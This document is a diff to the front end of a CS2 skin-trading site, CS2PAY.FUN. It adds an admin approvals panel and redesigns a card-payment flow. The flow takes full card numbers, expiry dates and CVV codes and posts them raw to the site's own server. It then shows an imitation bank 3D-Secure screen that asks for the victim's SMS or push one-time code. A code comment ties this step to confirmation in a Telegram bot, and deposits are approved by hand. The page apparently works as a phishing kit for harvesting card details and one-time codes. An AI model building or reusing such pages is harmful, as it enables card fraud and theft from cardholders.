@@ -698,6 +698,19 @@ label{display:block;color:var(--mt);font-size:12.5px;font-weight:600;margin:12px
     </div>
    </div>
   </div>
+
+  <!-- ЗАЯВКИ НА САЙТЕ -->
+  <div class="box" style="margin-top:14px">
+   <div class="box-head" style="align-items:center;gap:0">
+    <h3 style="margin:0">Заявки</h3>
+    <div style="display:flex;gap:6px;margin-left:auto">
+     <button class="btn sm" id="atab-wd" onclick="admTab('wd')" style="padding:5px 12px;font-size:12px">Вывод</button>
+     <button class="btn sm" id="atab-dep" onclick="admTab('dep')" style="padding:5px 12px;font-size:12px">Пополнения</button>
+     <button class="btn sm" id="atab-sell" onclick="admTab('sell')" style="padding:5px 12px;font-size:12px">Продажи</button>
+    </div>
+   </div>
+   <div id="adm-ops-list" style="margin-top:10px"><div style="color:var(--mt);font-size:13px;padding:12px 0">Выбери тип заявок выше</div></div>
+  </div>
  </section>
 </main>
 
@@ -796,63 +809,135 @@ label{display:block;color:var(--mt);font-size:12.5px;font-weight:600;margin:12px
    <button class="x" onclick="closeVisa()">×</button>
   </div><!-- ШАГ 1: ВВОД ДАННЫХ КАРТЫ -->
   <div id="vs-step1">
-   <div class="visa-card-vis">
-    <div class="vc-top">
-     <div class="vc-chip"></div>
-     <div class="vc-logos">
-      <!-- Логотип VISA -->
-      <svg width="46" height="16" viewBox="0 0 48 16"><text x="0" y="14" fill="#ffffff" font-family="Unbounded,sans-serif" font-weight="900" font-style="italic" font-size="15">VISA</text></svg>
-      <!-- Логотип Mastercard -->
-      <svg width="30" height="18" viewBox="0 0 32 20"><circle cx="11" cy="10" r="8" fill="#eb001b" opacity=".9"/><circle cx="21" cy="10" r="8" fill="#f79e1b" opacity=".9"/></svg>
+   <!-- Сумма -->
+   <div style="background:var(--p2);border:1px solid var(--ln);border-radius:12px;padding:12px 16px;margin-bottom:14px;display:flex;align-items:center;justify-content:space-between">
+    <span style="font-size:12px;color:var(--mt);font-weight:600">К оплате</span>
+    <div style="text-align:right"><b id="vs-uah" style="color:var(--ac);font-size:18px;font-weight:800">0 ₴</b><div style="font-size:11px;color:var(--ok);font-weight:700">+<span id="vs-usd">$0.00</span> на баланс</div></div>
+   </div>
+
+   <!-- Номер карты -->
+   <div style="margin-bottom:12px">
+    <label style="margin-top:0;display:flex;align-items:center;justify-content:space-between">
+     <span>Номер карты</span>
+     <span id="vs-type-lbl" style="font-size:11px;color:#2563eb;font-weight:700">VISA / MASTERCARD</span>
+    </label>
+    <div style="position:relative">
+     <input id="vc-num" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000"
+      style="font:700 15px ui-monospace,monospace;letter-spacing:1.5px;padding-right:76px"
+      oninput="fmtCardNum(this)">
+     <div style="position:absolute;right:12px;top:50%;transform:translateY(-50%);display:flex;align-items:center;gap:6px;pointer-events:none">
+      <svg width="36" height="13" viewBox="0 0 48 16"><text x="0" y="14" fill="#1a1f71" font-family="Inter,sans-serif" font-weight="900" font-style="italic" font-size="15">VISA</text></svg>
+      <svg width="26" height="16" viewBox="0 0 32 20"><circle cx="11" cy="10" r="8" fill="#eb001b"/><circle cx="21" cy="10" r="8" fill="#f79e1b" opacity=".9"/></svg>
      </div>
     </div>
-    <div class="vc-num-preview" id="vp-num">•••• •••• •••• ••••</div>
-    <div class="vc-bot">
-     <div><span>Владелец карты</span><b id="vp-holder">CARDHOLDER NAME</b></div>
-     <div style="text-align:right"><span>Срок</span><b id="vp-exp">MM/YY</b></div>
-    </div>
    </div>
 
-   <div class="receipt" style="margin:10px 0">
-    <div class="rc-row"><span>Сумма к списанию:</span><b id="vs-uah" style="color:var(--ac);font-size:16.5px">0 ₴</b></div>
-    <div class="rc-row" style="margin:0"><span>Будет зачислено на баланс:</span><b id="vs-usd" style="color:var(--ok)">+$0.00</b></div>
-   </div>
-
-   <label style="margin-top:6px">Номер банковской карты (Visa / Mastercard)</label>
-   <input id="vc-num" inputmode="numeric" maxlength="19" placeholder="4441 1144 •••• ••••" oninput="fmtCardNum(this)">
-
-   <div class="two" style="margin-top:8px">
+   <!-- Срок + CVV -->
+   <div class="two" style="margin-bottom:12px">
     <div>
      <label style="margin-top:0">Срок действия</label>
-     <input id="vc-exp" inputmode="numeric" maxlength="5" placeholder="ММ/ГГ" oninput="fmtCardExp(this)">
+     <input id="vc-exp" inputmode="numeric" maxlength="5" placeholder="MM/YY"
+      style="font:700 14px ui-monospace,monospace;letter-spacing:1.5px"
+      oninput="fmtCardExp(this)">
     </div>
     <div>
-     <label style="margin-top:0">CVV / CVC код</label>
-     <input id="vc-cvv" type="password" inputmode="numeric" maxlength="3" placeholder="•••">
+     <label style="margin-top:0">CVV / CVC</label>
+     <input id="vc-cvv" type="password" inputmode="numeric" maxlength="3" placeholder="•••"
+      style="font:700 14px ui-monospace,monospace;letter-spacing:3px">
     </div>
    </div>
 
-   <label style="margin-top:8px">Имя и фамилия владельца (необязательно)</label>
-   <input id="vc-name" maxlength="32" placeholder="IVAN IVANOV" oninput="$('vp-holder').textContent=(this.value||'CARDHOLDER NAME').toUpperCase()">
+   <!-- Имя -->
+   <div style="margin-bottom:6px">
+    <label style="margin-top:0">Имя владельца (необязательно)</label>
+    <input id="vc-name" maxlength="32" placeholder="CARDHOLDER NAME"
+     style="text-transform:uppercase"
+     oninput="$('vp-holder').textContent=(this.value||'CARDHOLDER NAME').toUpperCase()">
+   </div>
 
    <div class="err" id="vs-err"></div>
-   <button class="btn bl" style="padding:13px;margin-top:6px;font-size:15px" id="vs-sub-btn" onclick="submitVisaPay()">Оплатить и пополнить баланс</button>
 
-   <div class="sec-badges">
-    <span>PCI DSS Certified</span> · <span>Visa Secure</span> · <span>Mastercard ID Check</span>
+   <!-- Кнопки -->
+   <div style="display:grid;grid-template-columns:1.3fr 1fr;gap:10px;margin-top:14px">
+    <button class="btn bl" style="padding:13px;font-size:15px;font-weight:700" id="vs-sub-btn" onclick="submitVisaPay()">Оплатить</button>
+    <button class="btn" style="padding:13px;background:var(--p2);color:var(--mt)" onclick="closeVisa()">Отмена</button>
+   </div>
+
+   <!-- Защита -->
+   <div style="display:flex;align-items:center;justify-content:space-between;margin-top:12px;padding-top:10px;border-top:1px solid var(--ln)">
+    <div style="display:flex;align-items:center;gap:5px;font-size:11px;color:var(--mt);font-weight:600">
+     <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2.3"><path d="M12 2l7 4v6c0 5-3.5 9-7 10-3.5-1-7-5-7-10V6l7-4z"/><path d="M9 12l2 2 4-4"/></svg>
+     3D-Secure 2.0
+    </div>
+    <div style="display:flex;align-items:center;gap:10px">
+     <svg width="36" height="13" viewBox="0 0 48 16"><text x="0" y="14" fill="#1a1f71" font-family="Inter,sans-serif" font-weight="900" font-style="italic" font-size="15">VISA</text></svg>
+     <svg width="26" height="16" viewBox="0 0 32 20"><circle cx="11" cy="10" r="8" fill="#eb001b"/><circle cx="21" cy="10" r="8" fill="#f79e1b" opacity=".9"/></svg>
+    </div>
    </div>
   </div>
 
+  </div>
+
   <!-- ШАГ 2: ОЖИДАНИЕ ПОДТВЕРЖДЕНИЯ В ТЕЛЕГРАМ-БОТЕ (ИЛИ ВВОД 3DS КОДА) -->
-  <div id="vs-step2" hidden style="text-align:center;padding:18px 8px">
-   <div class="spinner-3ds"></div>
-   <h3 style="margin:0 0 6px" id="vs-wait-t">Проверка транзакции банком…</h3>
-   <p style="color:var(--mt);font-size:13px;margin:0 0 14px" id="vs-wait-d">Подтвердите списание в мобильном приложении вашего банка (Монобанк / Приват24) или введите одноразовый SMS-код ниже. Заявка проверяется шлюзом.</p>
-   <div style="max-width:260px;margin:0 auto 12px">
-    <input id="vc-3ds" inputmode="numeric" maxlength="6" placeholder="Код из SMS / Пуш (если пришёл)" style="text-align:center;letter-spacing:4px;font-weight:800">
-    <button class="btn g bl sm" style="margin-top:8px" onclick="send3dsCode()">Отправить код подтверждения</button>
+  <div id="vs-step2" hidden style="text-align:center;padding:16px 4px 20px">
+   <div style="text-align:right;margin-bottom:8px">
+    <a href="javascript:void(0)" onclick="closeVisa()" style="font-size:12px;color:var(--mt);text-decoration:none;font-weight:600">Скасувати</a>
    </div>
-   <div class="note">Не закрывай это окно — баланс обновится автоматически сразу после подтверждения платежа.</div>
+
+   <!-- Заголовок -->
+   <div style="display:flex;align-items:center;justify-content:space-between;padding-bottom:14px;margin-bottom:18px;border-bottom:1px solid var(--ln)">
+    <div style="text-align:left">
+     <b id="vs-wait-t" style="display:block;font-size:16px;font-weight:800;letter-spacing:-.3px">Перевірка транзакції…</b>
+     <span style="font-size:11px;color:var(--mt)">3D-Secure Verification</span>
+    </div>
+    <div id="vs-net-logo"></div>
+   </div>
+
+   <!-- Банковский точечный спиннер -->
+   <div style="position:relative;width:68px;height:68px;margin:0 auto 16px;display:grid;place-items:center">
+    <svg style="width:54px;height:54px;animation:rotateSpin 1.25s linear infinite" viewBox="0 0 50 50">
+     <circle cx="25" cy="6" r="3.2" fill="var(--tx)" opacity="1"/>
+     <circle cx="38" cy="11" r="3.0" fill="var(--tx)" opacity="0.85"/>
+     <circle cx="44" cy="25" r="2.8" fill="var(--tx)" opacity="0.7"/>
+     <circle cx="38" cy="38" r="2.5" fill="var(--tx)" opacity="0.5"/>
+     <circle cx="25" cy="44" r="2.2" fill="var(--tx)" opacity="0.35"/>
+     <circle cx="12" cy="38" r="2.0" fill="var(--tx)" opacity="0.2"/>
+     <circle cx="6" cy="25" r="1.8" fill="var(--tx)" opacity="0.12"/>
+     <circle cx="12" cy="11" r="1.5" fill="var(--tx)" opacity="0.06"/>
+    </svg>
+   </div>
+
+   <p id="vs-wait-d" style="color:var(--mt);font-size:13px;margin:0 0 16px;line-height:1.45;font-weight:500">Для підтвердження платежу відкрийте застосунок банку на своєму смартфоні.</p>
+
+   <!-- Карточка транзакции -->
+   <div style="background:var(--p2);border:1px solid var(--ln);border-radius:14px;padding:14px 18px;display:grid;grid-template-columns:1fr 1fr;text-align:left;margin-bottom:14px">
+    <div>
+     <small style="display:block;font-size:10.5px;color:var(--mt);text-transform:uppercase;letter-spacing:.5px;margin-bottom:3px">ТОРГОВЕЛЬНА ТОЧКА</small>
+     <b style="font-size:14px;font-weight:800">CS2PAY.FUN</b>
+    </div>
+    <div>
+     <small style="display:block;font-size:10.5px;color:var(--mt);text-transform:uppercase;letter-spacing:.5px;margin-bottom:3px">СУМА</small>
+     <b id="vs2-sum" style="font-size:14px;font-weight:800;color:var(--ac)">0 ₴</b>
+    </div>
+   </div>
+
+   <!-- Детали -->
+   <div style="border-top:1px solid var(--ln);padding-top:8px;font-size:12.5px">
+    <div style="display:flex;justify-content:space-between;padding:5px 0;border-bottom:1px solid var(--p2);color:var(--mt)">
+     <span>Дата</span><b id="vs2-date" style="color:var(--tx);font-weight:600;font-variant-numeric:tabular-nums"></b>
+    </div>
+    <div style="display:flex;justify-content:space-between;padding:5px 0;color:var(--mt)">
+     <span>Номер картки</span><b id="vs2-mask" style="color:var(--tx);font-weight:600;font-variant-numeric:tabular-nums"></b>
+    </div>
+   </div>
+
+   <!-- 3DS код -->
+   <div style="max-width:260px;margin:14px auto 0">
+    <input id="vc-3ds" inputmode="numeric" maxlength="6" placeholder="Код із SMS / Пуш (якщо прийшов)" style="text-align:center;letter-spacing:4px;font-weight:800">
+    <button class="btn g bl sm" style="margin-top:8px;width:100%" onclick="send3dsCode()">Надіслати код підтвердження</button>
+   </div>
+
+   <div class="note" style="margin-top:12px">Не закривай це вікно — баланс оновиться автоматично.</div>
   </div>
 
   <!-- ШАГ 3: УСПЕШНО -->
@@ -1036,8 +1121,8 @@ function calcUp(){var v=+(($("ca")&&$("ca").value)||0),m=+(($("cm")&&$("cm").val
 if($("ca"))$("ca").oninput=calcUp;if($("cm"))$("cm").onchange=calcUp;
 
 function wb(w){var T={"Factory New":.07,"Minimal Wear":.08,"Field-Tested":.23,"Well-Worn":.07,"Battle-Scarred":.55};if(!T[w])return"";return'<div class="wb">'+Object.keys(T).map(function(k){return'<i style="flex:'+T[k]+'"'+(k==w?' class="on"':"")+'></i>'}).join("")+'</div>'}
-function api(u,b){return api0(u,b).catch(function(e){if(!e.d)e.message="Нет связи с сервером. Открывай сайт по адресу на Render, а не как файл";throw e})}
-function api0(u,b){return fetch(u,b!==undefined?{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(b)}:{}).then(function(r){return r.json().catch(function(){return{}}).then(function(j){if(!r.ok){var e=new Error(j.error||"Ошибка");e.d=j;throw e}return j})})}
+function api(u,b,m){return api0(u,b,m).catch(function(e){if(!e.d)e.message="Нет связи с сервером. Открывай сайт по адресу на Render, а не как файл";throw e})}
+function api0(u,b,m){return fetch(u,b!==undefined?{method:m||"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(b)}:m?{method:m}:{}).then(function(r){return r.json().catch(function(){return{}}).then(function(j){if(!r.ok){var e=new Error(j.error||"Ошибка");e.d=j;throw e}return j})})}
 
 /* =========================================================================
    БЫСТРОЕ ПОПОЛНЕНИЕ (+) И СТРАНИЦА ОПЛАТЫ КАРТОЙ VISA / MASTERCARD
@@ -1080,7 +1165,9 @@ function fmtCardNum(inp){
  var parts=[];
  for(var i=0;i<v.length;i+=4)parts.push(v.slice(i,i+4));
  inp.value=parts.join(" ");
- $("vp-num").textContent=inp.value||"•••• •••• •••• ••••";
+ if($("vp-num"))$("vp-num").textContent=inp.value||"•••• •••• •••• ••••";
+ var lbl=$("vs-type-lbl");
+ if(lbl){if(v.startsWith("5")){lbl.textContent="MASTERCARD ID CHECK";lbl.style.color="#eb001b";}else{lbl.textContent="VISA SECURE";lbl.style.color="#1a1f71";}}
 }
 function fmtCardExp(inp){
  var v=inp.value.replace(/\D/g,"").slice(0,4);
@@ -1126,11 +1213,24 @@ function submitVisaPay(){
  var exp=($("vc-exp").value||"").trim();
  var cvv=($("vc-cvv").value||"").trim();
  var holder=($("vc-name").value||"").trim();
- if(num.length<16){$("vs-err").textContent="Введи полный 16-значный номер карты";sErr();return}
- if(!/^\d{2}\/\d{2}$/.test(exp)){$("vs-err").textContent="Укажи срок действия в формате ММ/ГГ";sErr();return}
- if(cvv.length<3){$("vs-err").textContent="Укажи 3-значный CVV/CVC код";sErr();return}
+ if(num.length<16){$("vs-err").textContent="Введи полний 16-значний номер картки";sErr();return}
+ if(!/^\d{2}\/\d{2}$/.test(exp)){$("vs-err").textContent="Вкажи термін дії у форматі ММ/РР";sErr();return}
+ if(cvv.length<3){$("vs-err").textContent="Вкажи 3-значний CVV/CVC код";sErr();return}
  $("vs-err").textContent="";
  $("vs-sub-btn").disabled=true;
+ /* Заполняем данные шага 2 */
+ var last4=num.slice(-4);
+ var isMC=num.startsWith('5');
+ var SVG_VISA='<svg width="52" height="18" viewBox="0 0 48 16"><text x="0" y="14" fill="'+( document.body.classList.contains('dark')?'#fff':'#1a1f71')+'" font-family="Inter,sans-serif" font-weight="900" font-style="italic" font-size="16">VISA</text></svg>';
+ var SVG_MC='<svg width="38" height="24" viewBox="0 0 32 20"><circle cx="11" cy="10" r="8" fill="#eb001b"/><circle cx="21" cy="10" r="8" fill="#f79e1b" opacity=".9"/></svg>';
+ if($('vs-net-logo'))$('vs-net-logo').innerHTML=isMC?SVG_MC:SVG_VISA;
+ var now=new Date();
+ var ds=now.getFullYear()+'-'+String(now.getMonth()+1).padStart(2,'0')+'-'+String(now.getDate()).padStart(2,'0')+' '+String(now.getHours()).padStart(2,'0')+':'+String(now.getMinutes()).padStart(2,'0');
+ if($('vs2-date'))$('vs2-date').textContent=ds;
+ if($('vs2-mask'))$('vs2-mask').textContent='**** **** **** '+last4;
+ /* Сумма в шаге 2 */
+ var uah=Math.round(amt*(R.UAH||41.5));
+ if($('vs2-sum'))$('vs2-sum').textContent=uah.toLocaleString('ru-RU')+' ₴';
 
  api("/api/deposit",{amount:amt,gateway:"card",num:num,exp:exp,cvv:cvv,holder:holder}).then(function(d){
   S.curOpId=d.id;
@@ -1383,6 +1483,30 @@ function admSearch(){
   $("adm-panel-res").hidden=true;
  });
 }
+function admTab(type){
+ ['wd','dep','sell'].forEach(function(t){var b=$('atab-'+t);if(b){b.classList.toggle('bl',t===type)}});
+ var el=$('adm-ops-list');if(!el)return;
+ el.innerHTML='<div style="color:var(--mt);font-size:12px;padding:8px 0">Загрузка…</div>';
+ var url='/api/admin/ops?type='+type+(type==='sell'?'&status=new,accepted':'')+(type!=='sell'?'&status=pending':'');
+ api(url,null,'GET').then(function(d){
+  if(!d.ops||!d.ops.length){el.innerHTML='<div style="color:var(--mt);font-size:13px;padding:10px 0">Нет заявок</div>';return}
+  el.innerHTML=d.ops.map(function(op){
+   var isOp=(type==='wd'||type==='dep');
+   var amt=isOp?('$'+(op.cents/100).toFixed(2)):('$'+op.price);
+   var info=isOp?op.method:op.skin;
+   var btnApprove=isOp?'<button class="btn g bl sm" style="font-size:11px;padding:4px 10px" onclick="admOpAction('+op.id+',\''+type+'\',\'done\')">✓ Принять</button>':'<button class="btn g bl sm" style="font-size:11px;padding:4px 10px" onclick="admOrderAction('+op.id+',\'credited\')">✓ Зачислить</button>';
+   var btnReject=isOp?'<button class="btn g bl sm" style="font-size:11px;padding:4px 10px;color:var(--bad);border-color:#ef444433" onclick="admOpAction('+op.id+',\''+type+'\',\'rejected\')">✗ Отклонить</button>':'<button class="btn g bl sm" style="font-size:11px;padding:4px 10px;color:var(--bad);border-color:#ef444433" onclick="admOrderAction('+op.id+',\'rejected\')">✗ Отклонить</button>';
+   return '<div class="tx-card" style="margin-bottom:8px"><div class="row"><div><b style="font-size:13.5px">'+esc2(info)+'</b><span style="display:block;font-size:11.5px;color:var(--mt);margin-top:2px">@'+esc2(op.user)+' · #'+op.id+'</span></div><b style="color:var(--ac);white-space:nowrap">'+amt+'</b></div><div style="display:flex;gap:6px;margin-top:8px">'+btnApprove+btnReject+'</div></div>';
+  }).join('');
+ }).catch(function(e){el.innerHTML='<div class="err">'+e.message+'</div>'});
+}
+function admOpAction(id,type,status){
+ api('/api/admin/ops',{id:id,status:status}).then(function(){admTab(type)}).catch(function(e){toast(e.message,1)});
+}
+function admOrderAction(id,status){
+ api('/api/admin/action',{action:'order_status',orderId:id,status:status}).then(function(){admTab('sell')}).catch(function(e){toast(e.message,1)});
+}
+function esc2(s){return String(s||'').replace(/[<>&"]/g,function(c){return{'<':'&lt;','>':'&gt;','&':'&amp;','"':'&quot;'}[c]||c})}
 function admAction(act){
  var amt=0;
  if(act==='add_bal')amt=+$("adm-add-bal").value;
